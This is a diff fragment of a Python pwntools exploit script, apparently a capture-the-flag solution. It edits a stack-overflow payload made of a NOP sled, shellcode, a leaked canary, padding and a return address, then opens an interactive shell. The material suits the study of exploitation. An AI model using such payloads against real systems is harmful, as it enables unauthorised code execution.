@@ -32,7 +32,7 @@ if __name__=='__main__':
 	
 	log.info(r.recvuntil('!'))
 	log.info(r.recvuntil('!'))	
-	r.sendline(b'\x90'*(250-len(shellcode))+shellcode+p32(canary)+b'JUNK'+b'JUNK'+p32(s1_addr)*3)
+	r.sendline(b'\x90'*(250-len(shellcode))+shellcode+p32(canary)+b'JUNK'+b'JUNK'+p32(s1_addr))
 				
 	r.interactive()	
 
